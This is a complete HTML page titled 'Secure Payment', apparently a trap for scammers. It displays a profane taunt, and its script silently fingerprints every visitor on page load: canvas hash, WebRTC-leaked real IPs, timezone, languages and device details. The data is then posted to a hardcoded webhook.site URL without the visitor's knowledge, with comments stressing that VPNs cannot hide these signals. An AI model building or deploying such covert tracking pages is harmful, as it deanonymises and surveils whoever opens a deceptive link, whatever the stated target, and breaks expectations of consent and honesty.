<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Payment</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #0a0a0a;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 2rem;
    }
    .msg { max-width: 560px; }
    .emoji { font-size: 64px; margin-bottom: 1.5rem; }
    h1 {
      font-size: 48px;
      font-weight: 800;
      color: #ff3b30;
      margin-bottom: 1rem;
      line-height: 1.1;
    }
    p {
      font-size: 18px;
      color: #888;
      line-height: 1.6;
    }
    #translated {
      font-size: 28px;
      color: #ff3b30;
      margin-top: 1.4rem;
      min-height: 40px;
      font-weight: 600;
      letter-spacing: 0.01em;
    }
    .cursor {
      display: inline-block;
      width: 3px;
      height: 0.9em;
      background: #ff3b30;
      margin-left: 3px;
      vertical-align: middle;
      animation: blink 0.65s steps(1) infinite;
    }
    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
    .detail {
      margin-top: 2rem;
      font-size: 13px;
      color: #333;
      font-family: monospace;
    }
  </style>
</head>
<body>

<div class="msg">
  <div class="emoji">&#128405;</div>
  <h1>Fuck You, Scammer.</h1>
  <p>Your device fingerprint, IP address, timezone, and system info have been logged and reported.</p>
  <div id="translated"></div>
  <p class="detail">Have a great day.</p>
</div>

<canvas id="fp-canvas" width="300" height="60" style="display:none;"></canvas>

<script>
  // ============================================================
  // CONFIGURATION — paste your webhook.site URL here
  // ============================================================
  const WEBHOOK_URL = "https://webhook.site/a584ac2c-cc09-4d50-a290-82f1106270ed";

  // ============================================================
  // TYPEWRITER EFFECT
  // Uses Array.from() to safely handle multibyte unicode (CJK, Arabic, etc.)
  // ============================================================
  function typeWriter(el, text, speed = 55) {
    el.innerHTML = "";
    const chars = Array.from(text);
    const cursor = document.createElement("span");
    cursor.className = "cursor";
    el.appendChild(cursor);
    let i = 0;
    const interval = setInterval(() => {
      if (i < chars.length) {
        el.insertBefore(document.createTextNode(chars[i]), cursor);
        i++;
      } else {
        clearInterval(interval);
        setTimeout(() => cursor.remove(), 1500);
      }
    }, speed);
  }

  // ============================================================
  // MYMEMORY TRANSLATION
  // Free REST API — no key needed, 5000 requests/day free.
  // Skips translation if result looks like it came back untranslated.
  // ============================================================
  async function translateMessage(langCode) {
    try {
      const res = await fetch(
        `https://api.mymemory.translated.net/get?q=Fuck+you+scammer&langpair=en|${langCode}`
      );
      const data = await res.json();
      const translated = data.responseData?.translatedText;
      if (translated && translated.toLowerCase() !== "fuck you scammer") {
        return translated;
      }
      return null;
    } catch (err) {
      return null;
    }
  }

  // ============================================================
  // LANGUAGE DETECTION + TRANSLATION TRIGGER
  // Reads the OS/browser language setting — unaffected by VPN.
  // Strips region suffix: "zh-CN" -> "zh", "ru-RU" -> "ru"
  // Only fires if language is not English.
  // ============================================================
  async function handleTranslation() {
    const fullLang = navigator.language || navigator.userLanguage || "en";
    const langCode = fullLang.split("-")[0].toLowerCase();
    if (langCode === "en") return;

    const el = document.getElementById("translated");

    // Show blinking cursor immediately while fetch runs
    el.innerHTML = '<span class="cursor"></span>';

    const translation = await translateMessage(langCode);
    if (translation) {
      typeWriter(el, translation);
    } else {
      el.innerHTML = "";
    }
  }

  // ============================================================
  // CANVAS FINGERPRINT
  // Draws an invisible canvas, hashes raw pixel data.
  // Unique per GPU + driver + OS. Stable across VPN switches.
  // ============================================================
  function getCanvasFingerprint() {
    const canvas = document.getElementById("fp-canvas");
    const ctx = canvas.getContext("2d");
    ctx.fillStyle = "#f0f0f0";
    ctx.fillRect(0, 0, 300, 60);
    ctx.fillStyle = "#6d1ed4";
    ctx.font = "14px Arial";
    ctx.fillText("secure-token-v2", 10, 25);
    ctx.strokeStyle = "rgba(200,80,80,0.6)";
    ctx.beginPath();
    ctx.arc(150, 40, 15, 0, Math.PI * 2);
    ctx.stroke();
    const dataURL = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataURL.length; i++) {
      hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
      hash |= 0;
    }
    return Math.abs(hash).toString(16).padStart(8, "0");
  }

  // ============================================================
  // TIMEZONE + LOCALE
  // OS-level — VPN cannot mask this.
  // ============================================================
  function getTimezoneData() {
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const locale = navigator.language;
    const locales = navigator.languages ? [...navigator.languages] : [locale];
    const offset = -new Date().getTimezoneOffset();
    const sign = offset >= 0 ? "+" : "-";
    const hrs = String(Math.floor(Math.abs(offset) / 60)).padStart(2, "0");
    const mins = String(Math.abs(offset) % 60).padStart(2, "0");
    return {
      timezone: tz,
      utc_offset: `UTC${sign}${hrs}:${mins}`,
      primary_language: locale,
      all_languages: locales
    };
  }

  // ============================================================
  // WEBRTC IP LEAK
  // STUN ICE candidates expose real IPs before VPN can intercept.
  // ============================================================
  function getWebRTCIPs() {
    return new Promise((resolve) => {
      const ips = { local: [], public: [] };
      const RTCPeer = window.RTCPeerConnection
        || window.webkitRTCPeerConnection
        || window.mozRTCPeerConnection;

      if (!RTCPeer) { resolve({ error: "WebRTC not supported" }); return; }

      const pc = new RTCPeer({
        iceServers: [
          { urls: "stun:stun.l.google.com:19302" },
          { urls: "stun:stun1.l.google.com:19302" }
        ]
      });

      const seen = new Set();
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer));

      pc.onicecandidate = (e) => {
        if (!e || !e.candidate || !e.candidate.candidate) { finish(); return; }
        const line = e.candidate.candidate;
        const ipRegex = /(\d{1,3}(\.\d{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/gi;
        let m;
        while ((m = ipRegex.exec(line)) !== null) {
          const ip = m[1];
          if (seen.has(ip) || ip === "0.0.0.0") continue;
          seen.add(ip);
          if (ip.startsWith("192.168") || ip.startsWith("10.") || ip.startsWith("172.")) {
            ips.local.push(ip);
          } else if (!ip.startsWith("::") && !ip.startsWith("fe80")) {
            ips.public.push(ip);
          }
        }
      };

      function finish() { pc.close(); resolve(ips); }
      setTimeout(finish, 4000);
    });
  }

  // ============================================================
  // EXTRA SIGNALS
  // ============================================================
  function getExtraSignals() {
    return {
      screen_resolution: `${screen.width}x${screen.height}`,
      color_depth: screen.colorDepth,
      device_memory_gb: navigator.deviceMemory || "unknown",
      cpu_cores: navigator.hardwareConcurrency || "unknown",
      platform: navigator.platform || "unknown",
      vendor: navigator.vendor || "unknown",
      do_not_track: navigator.doNotTrack || "not set",
      cookies_enabled: navigator.cookieEnabled,
      user_agent: navigator.userAgent,
      referrer: document.referrer || "direct"
    };
  }

  // ============================================================
  // MAIN
  // All collection runs in parallel on page load.
  // Translation updates the DOM on its own when ready.
  // Webhook POST is silent and uses keepalive.
  // ============================================================
  async function main() {
    const [webrtcData, tzData, canvasFP, extraData] = await Promise.all([
      getWebRTCIPs(),
      Promise.resolve(getTimezoneData()),
      Promise.resolve(getCanvasFingerprint()),
      Promise.resolve(getExtraSignals()),
      handleTranslation()
    ]);

    const payload = {
      event: "page_load",
      timestamp: new Date().toISOString(),
      webrtc_ips: webrtcData,
      timezone: tzData,
      canvas_fingerprint: canvasFP,
      device: extraData
    };

    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(payload));
      } else {
        fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true
        });
      }
    } catch (err) {
      // fail silently
    }
  }

  main();
</script>

</body>
</html>
